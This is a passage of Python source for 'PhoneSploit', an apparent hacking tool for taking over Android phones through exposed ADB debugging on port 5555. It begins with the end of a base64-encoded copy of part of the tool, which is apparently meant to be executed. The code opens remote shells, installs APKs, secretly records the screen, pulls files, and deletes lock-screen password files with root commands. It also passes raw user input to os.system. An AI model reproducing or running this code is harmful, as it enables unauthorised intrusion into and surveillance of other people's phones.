ICBlbGlmIG9wdGlvbiA9PSAnMTgnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBpcCBhZGRyZXNzIHNob3cgd2xhbjAiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzE5JzoKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgYSBwYWNrYWdlIG5hbWUuIFRoZXkgbG9vayBsaWtlIHRoaXMgLS0+IGNvbS5zbmFwY2hhdC5hbmRyb2lkIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcGFja2FnZV9uYW1lID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgc2hlbGwgcG0gcGF0aCAiK3BhY2thZ2VfbmFtZSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICBbezB9K3sxfV1FbnRlciBUaGUgcGF0aC5sb29rcyBsaWtlIHRoaXMgL2RhdGEvYXBwL2NvbS5zbmFwY2hhdC5hbmRyb2lkLXFXZ0RjQmlDRXZBTnE2b3BfTlBxZUE9PS9iYXNlLmFwayIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHBhdGggPSByYXdfaW5wdXQoIiAgICAgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBwcmludCAoKCIgICAgICAgICAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAgICAgICAgW3swfSt7MX1dRW50ZXIgVGhlIGxvY2F0aW9uIHRvIHN0b3JlIHRoZSBhcGs6IFtEZWZhdWx0OiBwcmVzZW50IHdvcmtpbmcgZGlyZWN0b3J5XSIpICAuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgbG9jYXRpb24gPSAgIHJhd19pbnB1dCgiICAgICAgICAgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHB1bGxfYXBrKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsiIHB1bGwgIitwYXRoKyIgIitsb2NhdGlvbikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyMCc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIHNoZWxsIGR1bXBzeXMgYmF0dGVyeSIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMjEnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiICtkZXZpY2VfbmFtZSsgIiBzaGVsbCBuZXRzdGF0IikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyMic6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XSBUbyB0dXJuIHdpZmkgYmFjayBvbiB5b3UgbmVlZCB0aGUgZGV2aWNlIHRvIGJlIHBsdWdlZCBpbi4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIG9uX29mZiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIiAgICBbIitGb3JlLlJFRCsiKyIrRm9yZS5XSElURSsiXVdvdWxkIHlvdSBsaWtlIHRoZSB3aWZpICIrRm9yZS5HUkVFTiArIm9uIitGb3JlLldISVRFICsiLyIrRm9yZS5SRUQgKyJvZmYgIitGb3JlLldISVRFKQogICAgICAgICAgICBpZiBvbl9vZmYgPT0gJ29mZic6CiAgICAgICAgICAgICAgICBjb21tYW5kID0gIiBzaGVsbCBzdmMgd2lmaSBkaXNhYmxlIgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY29tbWFuZCA9ICIgc2hlbGwgc3ZjIHdpZmkgZW5hYmxlIgoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZStjb21tYW5kKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzIzJzoKICAgICAgICAgICAgcHJpbnQgKChGb3JlLldISVRFICsgIiAgICBbezB9K3sxfV17MX1USEUgREVWSUNFIE5FRURTIFRPIEJFIFJPT1RFRCBUTyBDT05USU5VRSBUTyBFWElUIFVTRSBDVFJMICtDIFRISVMgSVMgQUxTTyBVTlRFU1RFRCIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgIioqKioqKioqKioqKioqKioqKlRSWUlORyBUTyBSRU1PVkUgUEFTUyoqKioqKioqKioqKioqKioqKiIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vZ2VzdHVyZS5rZXknIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHN1IDAgJ3JtIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGInIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHN1IDAgJ3JtIC9kYXRhL3N5c3RlbS9sb2Nrc2V0dGluZ3MuZGItd2FsJyIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzdSAwICdybSAvZGF0YS9zeXN0ZW0vbG9ja3NldHRpbmdzLmRiLXNobSciKQogICAgICAgICAgICBwcmludCAoRm9yZS5SRUQgKyAiKioqKioqKioqKioqKioqKioqVFJZSU5HIFRPIFJFTU9WRSBQQVNTKioqKioqKioqKioqKioqKioqIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyNCc6CiAgICAgICAgICAgIHByaW50ICgnJycKICAgIDAgLS0+ICAiS0VZQ09ERV9VTktOT1dOIgogICAgMSAtLT4gICJLRVlDT0RFX01FTlUiCiAgICAyIC0tPiAgIktFWUNPREVfU09GVF9SSUdIVCIKICAgIDMgLS0+ICAiS0VZQ09ERV9IT01FIgogICAgNCAtLT4gICJLRVlDT0RFX0JBQ0siCiAgICA1IC0tPiAgIktFWUNPREVfQ0FMTCIKICAgIDYgLS0+ICAiS0VZQ09ERV9FTkRDQUxMIgogICAgNyAtLT4gICJLRVlDT0RFXzAiCiAgICA4IC0tPiAgIktFWUNPREVfMSIKICAgIDkgLS0+ICAiS0VZQ09ERV8yIgogICAgMTAgLS0+ICAiS0VZQ09ERV8zIgogICAgMTEgLS0+ICAiS0VZQ09ERV80IgogICAgMTIgLS0+ICAiS0VZQ09ERV81IgogICAgMTMgLS0+ICAiS0VZQ09ERV82IgogICAgMTQgLS0+ICAiS0VZQ09ERV83IgogICAgMTUgLS0+ICAiS0VZQ09ERV84IgogICAgMTYgLS0+ICAiS0VZQ09ERV85IgogICAgMTcgLS0+ICAiS0VZQ09ERV9TVEFSIgogICAgMTggLS0+ICAiS0VZQ09ERV9QT1VORCIKICAgIDE5IC0tPiAgIktFWUNPREVfRFBBRF9VUCIKICAgIDIwIC0tPiAgIktFWUNPREVfRFBBRF9ET1dOIgogICAgMjEgLS0+ICAiS0VZQ09ERV9EUEFEX0xFRlQiCiAgICAyMiAtLT4gICJLRVlDT0RFX0RQQURfUklHSFQiCiAgICAyMyAtLT4gICJLRVlDT0RFX0RQQURfQ0VOVEVSIgogICAgMjQgLS0+ICAiS0VZQ09ERV9WT0xVTUVfVVAiCiAgICAyNSAtLT4gICJLRVlDT0RFX1ZPTFVNRV9ET1dOIgogICAgMjYgLS0+ICAiS0VZQ09ERV9QT1dFUiIKICAgIDI3IC0tPiAgIktFWUNPREVfQ0FNRVJBIgogICAgMjggLS0+ICAiS0VZQ09ERV9DTEVBUiIKICAgIDI5IC0tPiAgIktFWUNPREVfQSIKICAgIDMwIC0tPiAgIktFWUNPREVfQiIKICAgIDMxIC0tPiAgIktFWUNPREVfQyIKICAgIDMyIC0tPiAgIktFWUNPREVfRCIKICAgIDMzIC0tPiAgIktFWUNPREVfRSIKICAgIDM0IC0tPiAgIktFWUNPREVfRiIKICAgIDM1IC0tPiAgIktFWUNPREVfRyIKICAgIDM2IC0tPiAgIktFWUNPREVfSCIKICAgIDM3IC0tPiAgIktFWUNPREVfSSIKICAgIDM4IC0tPiAgIktFWUNPREVfSiIKICAgIDM5IC0tPiAgIktFWUNPREVfSyIKICAgIDQwIC0tPiAgIktFWUNPREVfTCIKICAgIDQxIC0tPiAgIktFWUNPREVfTSIKICAgIDQyIC0tPiAgIktFWUNPREVfTiIKICAgIDQzIC0tPiAgIktFWUNPREVfTyIKICAgIDQ0IC0tPiAgIktFWUNPREVfUCIKICAgIDQ1IC0tPiAgIktFWUNPREVfUSIKICAgIDQ2IC0tPiAgIktFWUNPREVfUiIKICAgIDQ3IC0tPiAgIktFWUNPREVfUyIKICAgIDQ4IC0tPiAgIktFWUNPREVfVCIKICAgIDQ5IC0tPiAgIktFWUNPREVfVSIKICAgIDUwIC0tPiAgIktFWUNPREVfViIKICAgIDUxIC0tPiAgIktFWUNPREVfVyIKICAgIDUyIC0tPiAgIktFWUNPREVfWCIKICAgIDUzIC0tPiAgIktFWUNPREVfWSIKICAgIDU0IC0tPiAgIktFWUNPREVfWiIKICAgIDU1IC0tPiAgIktFWUNPREVfQ09NTUEiCiAgICA1NiAtLT4gICJLRVlDT0RFX1BFUklPRCIKICAgIDU3IC0tPiAgIktFWUNPREVfQUxUX0xFRlQiCiAgICA1OCAtLT4gICJLRVlDT0RFX0FMVF9SSUdIVCIKICAgIDU5IC0tPiAgIktFWUNPREVfU0hJRlRfTEVGVCIKICAgIDYwIC0tPiAgIktFWUNPREVfU0hJRlRfUklHSFQiCiAgICA2MSAtLT4gICJLRVlDT0RFX1RBQiIKICAgIDYyIC0tPiAgIktFWUNPREVfU1BBQ0UiCiAgICA2MyAtLT4gICJLRVlDT0RFX1NZTSIKICAgIDY0IC0tPiAgIktFWUNPREVfRVhQTE9SRVIiCiAgICA2NSAtLT4gICJLRVlDT0RFX0VOVkVMT1BFIgogICAgNjYgLS0+ICAiS0VZQ09ERV9FTlRFUiIKICAgIDY3IC0tPiAgIktFWUNPREVfREVMIgogICAgNjggLS0+ICAiS0VZQ09ERV9HUkFWRSIKICAgIDY5IC0tPiAgIktFWUNPREVfTUlOVVMiCiAgICA3MCAtLT4gICJLRVlDT0RFX0VRVUFMUyIKICAgIDcxIC0tPiAgIktFWUNPREVfTEVGVF9CUkFDS0VUIgogICAgNzIgLS0+ICAiS0VZQ09ERV9SSUdIVF9CUkFDS0VUIgogICAgNzMgLS0+ICAiS0VZQ09ERV9CQUNLU0xBU0giCiAgICA3NCAtLT4gICJLRVlDT0RFX1NFTUlDT0xPTiIKICAgIDc1IC0tPiAgIktFWUNPREVfQVBPU1RST1BIRSIKICAgIDc2IC0tPiAgIktFWUNPREVfU0xBU0giCiAgICA3NyAtLT4gICJLRVlDT0RFX0FUIgogICAgNzggLS0+ICAiS0VZQ09ERV9OVU0iCiAgICA3OSAtLT4gICJLRVlDT0RFX0hFQURTRVRIT09LIgogICAgODAgLS0+ICAiS0VZQ09ERV9GT0NVUyIKICAgIDgxIC0tPiAgIktFWUNPREVfUExVUyIKICAgIDgyIC0tPiAgIktFWUNPREVfTUVOVSIKICAgIDgzIC0tPiAgIktFWUNPREVfTk9USUZJQ0FUSU9OIgogICAgODQgLS0+ICAiS0VZQ09ERV9TRUFSQ0giCiAgICA4NSAtLT4gICJUQUdfTEFTVF9LRVlDT0RFIgogICAgICAgICAgICAnJycpCiAgICAgICAgICAgIHByaW50ICgoIlt7MH0rezF9XUVudGVyIGEgbnVtYmVyLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIG51bSA9IHJhd19pbnB1dChhcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGtleWNvZGUpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBpbnB1dCBrZXlldmVudCAiK251bSkKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcyNSc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIgK2RldmljZV9uYW1lKyAiIGR1bXBzeXMgYWN0aXZpdHkiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzAnOgogICAgICAgICAgICBnbG9iYWwgcGFnZTIKICAgICAgICAgICAgaWYgcGFnZTIgPT0gVHJ1ZToKICAgICAgICAgICAgICAgIGNsZWFyKHBhZ2VfMikKICAgICAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgY2xlYXIocGFnZV8xKQogICAgICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICdwJzoKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgICAgIHBhZ2UyID0gVHJ1ZQogICAgICAgICAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQogICAgICAgICAgICBwcmludCAocGFnZV8yKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJ2InOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgcGFnZTIgPSBGYWxzZQogICAgICAgICAgICBiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKICAgICAgICAgICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQogICAgICAgICAgICBwcmludCAocGFnZV8xKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzk5JzoKICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZWxzZToKICAgICAgICAgICAgb3Muc3lzdGVtKCJlcnJvcjogaW52YWxpZCBtZW51IG9wdGlvbiIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKCiAgICBtYWluKCkKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKZGVmIGNsZWFyKHBhZ2UpOgogICAgZ2xvYmFsIHBhZ2UyCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIGJhbm5lcl90aXRsZSA9IHJhbmRvbS5jaG9pY2UoW2xvZ29fZGVzaWduXzEsbG9nb19kZXNpZ25fMixsb2dvX2Rlc2lnbl8zLGxvZ29fZGVzaWduXzRdKQogICAgcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKSAgICAKICAgIHByaW50IChwYWdlKQoKCgojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gIAojIFJ1bgp5biA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIkhhdmUgeW91IGFscmVhZHkgaW5zdGFsbGVkIGFkYiB2aWEgY29tbWFuZCBsaW5lICIrRm9yZS5HUkVFTiArICJZIitGb3JlLldISVRFKyIvIitGb3JlLlJFRCsibiAiK0ZvcmUuV0hJVEUpCmlmIHluID09ICJuIjoKICAgIG9zLnN5c3RlbSgic3VkbyBhcHQgaW5zdGFsbCBhZGIiKQpwcmludCAoRm9yZS5SRUQgKyAiU3RhcnRpbmcgIGFkYiBzZXJ2ZXIuLiIpCm9zLnN5c3RlbSgiYWRiIHRjcGlwIDU1NTUiKQp0LnNsZWVwKDQpCm9zLnN5c3RlbSgnY2xlYXInKQpiYW5uZXJfdGl0bGUgPSByYW5kb20uY2hvaWNlKFtsb2dvX2Rlc2lnbl8xLGxvZ29fZGVzaWduXzIsbG9nb19kZXNpZ25fMyxsb2dvX2Rlc2lnbl80XSkKcHJpbnQgKEZvcmUuUkVEICsgYmFubmVyX3RpdGxlKQpwcmludCAocGFnZV8xKQptYWluKCkK"))




#-*- coding: utf-8 -*-

#Coded By ShuBhamg0sain
# Enjoy


#=============================
#Imports
import os
import sys
import random
import time as  t
from colorama import Fore, init

reload(sys)
sys.setdefaultencoding("utf-8")

#=============================
# Variables
CurrentDir = os.path.dirname(os.path.abspath(__file__))
load_count = 0
page2 = False

#=============================
#Install Functions
# def ColoringModeStartup():
#     coloring_file = open(CurrentDir+"\\install\\coloring.txt", "a+")
#     line = open(CurrentDir+"\\install\\coloring.txt", "a+").readline()
#     if 'init' in line:
#         init(convert=True)
#         main()
#     if 'false' in line:
#         main()
#     if "NOT_LOADED" in line:
#         platform_choice = raw_input("Are you loading this script in (W)indows or (L)inux: ")
#         open(CurrentDir+"\\install\\coloring.txt", "w").close()
#         if platform_choice.lower() == 'w':
#             coloring_file.write("init")
#         else:
#             coloring_file.write("false")
#             yn = raw_input(Fore.WHITE + "Have you already installed adb via command line "+Fore.GREEN + "Y"+Fore.WHITE+"/"+Fore.RED+"N "+Fore.WHITE)
#             if yn == "n":
#                 os.system("sudo apt install adb")
#             else:
#                 main()

#=============================
# Graphics # http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20

arrow = Fore.RED + "  └──>".decode("utf-8").strip() + Fore.WHITE
arrow = str(arrow)
connect = Fore.RED + "│".decode("utf-8").strip() + Fore.WHITE

logo_design_1 = ('''
  {0}  ____  __               
   / __ \/ /_  ____  ____  ___ 
  / /_/ / __ \/ __ \/ __ \/ _ \
{1} / ____/ / / / /_/ / / / /  
/_/   /_/ /_/\____/_/ /_/\___/
                                 /_/''').format(Fore.GREEN, Fore.WHITE, Fore.RED)

logo_design_2 = Fore.GREEN + '''                                             
  .;'                     `;,
 .;'  ,;'             `;,  `;,   {0}PhoneSploit
.;'  ,;'  ,;'     `;,  `;,  `;,
::   ::   :   {1}( ){0}   :   ::   ::  {1}Coded by ShuBhamg0sain / Metachar{0}
':.  ':.  ':. {1}/_\{0} ,:'  ,:'  ,:'
 ':.  ':.    {1}/___\{0}    ,:'  ,:'   
  ':.       {1}/_____\{0}      ,:'
           {1}/       \\{0}
'''.format(Fore.GREEN, Fore.WHITE, Fore.RED)

logo_design_pre = '''
{0}╔═╗{1}┬ ┬┌─┐┌┐┌┌─┐
{0}╠═╝{1}├─┤│ ││││├┤  
{0}╩  {1}┴ ┴└─┘┘└┘└─┘ '''.format(Fore.GREEN, Fore.WHITE, Fore.RED)
logo_design_3 = logo_design_pre.decode("utf-8")

logo_design_4 = '''
\033[92m
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm\033[0m:\033[92mNMMMMMMN\033[0m:\033[92mmMMd`
      hMMMMMMMMMMMMMMMMMMh
  \033[92m..  yyyyyyyyyyyyyyyyyyyy  ..              \033[0m Exploit time :) \033[92m
\033[92m.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.            \033[0m Thanks for downloading!\033[92m
\033[92m:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs'''

page_1 = '''\n
{0}[{1}1{0}] {2}Show Connected Devices      {0}[{1}6{0}] {2}Screen record a phone               {0}[{1}11{0}] {2}Uninstall an app                   
{0}[{1}2{0}] {2}Disconect all devices       {0}[{1}7{0}] {2}Screen Shot a picture on a phone    {0}[{1}12{0}] {2}Show real time log of device       
{0}[{1}3{0}] {2}Connect a new phone         {0}[{1}8{0}] {2}Restart Server                      {0}[{1}13{0}] {2}Dump System Info                   
{0}[{1}4{0}] {2}Access Shell on a phone     {0}[{1}9{0}] {2}Pull folders from phone to pc       {0}[{1}14{0}] {2}List all apps on a phone           
{0}[{1}5{0}] {2}Install an apk on a phone   {0}[{1}10{0}] {2}Turn The Device off                {0}[{1}15{0}] {2}Run an app                         


{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}p{0}] Next Page                           v1.2
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN)

page_2 = '''\n
{0}[{1}16{0}]{2} Port Forwarding                {0}[{1}21{0}]{2} NetStat 
{0}[{1}17{0}]{2} Grab wpa_supplicant            {0}[{1}22{0}]{2} Turn WiFi On/Off                 
{0}[{1}18{0}]{2} Show Mac/Inet                  {0}[{1}23{0}]{2} Remove Password
{0}[{1}19{0}]{2} Extract apk from app           {0}[{1}24{0}]{2} Use Keycode            
{0}[{1}20{0}]{2} Get Battery Status             {0}[{1}25{0}]{2} Get Current Activity                  


{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}b{0}] Back to page one
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN)


#=============================
#Main
def main():
    page_num = 1
    os.system("adb tcpip 5555")
    os.system("adb devices -l")
    print (("\n[{0}+{1}] Enter a phones ip address.(Type 99 to exit)").format(Fore.RED, Fore.WHITE))
    try:
        device_name = raw_input (arrow+" phonesploit"+Fore.RED + "(connect_phone) "+Fore.WHITE + "> ")
    except KeyboardInterrupt:
        main()
    if device_name == '':
        main()
    if device_name == '99':
        exit()
    os.system("adb connect "+device_name+":5555")
    option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

    while(1):
        if option == '1':
            os.system("adb devices -l")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option  ==  '2':
            os.system("adb disconnect")
            main()

        elif option == '3':
            main()

        elif option  == '4':
            os.system("adb -s "+device_name+" shell")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '5':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter the apk location.").format(Fore.RED, Fore.WHITE))
            apk_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
            os.system("adb -s  "+device_name+" install "+apk_location)
            print (Fore.GREEN  +  "Apk has been installed.")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option ==  '6':
            print (("     "+connect))
            print (("    [{0}+{1}] Please wait 3m its recording").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            os.system("adb -s "+device_name+" shell screenrecord /sdcard/demo.mp4")
            print (("    [{0}+{1}]Enter where you would like the video to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
            place_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(screen_record) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" pull /sdcard/demo.mp4 "+place_location)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option  == '7':
            os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
            print (("     "+connect))
            print (("    [{0}+{1}]Enter where you would like the screenshot to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
            place_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(screenshot) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '8':
            os.system("adb kill-server && adb start-server")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '9':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a file location on a device").format(Fore.RED, Fore.WHITE))
            file_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
            print (("        "+connect))
            print (("       [{0}+{1}]Enter where you would like the file to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
            place_location = raw_input("       "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '10':
            os.system("adb -s "+device_name+ " reboot ")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option ==  '11':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a package name.").format(Fore.RED, Fore.WHITE))
            package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" unistall "+package_name)
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '12':
            os.system('adb -s '+device_name+" logcat ")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '13':
            os.system("adb  -s "+device_name+" dumpsys")
            option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '14':
            os.system("adb -s " +device_name+ " shell pm list packages -f")
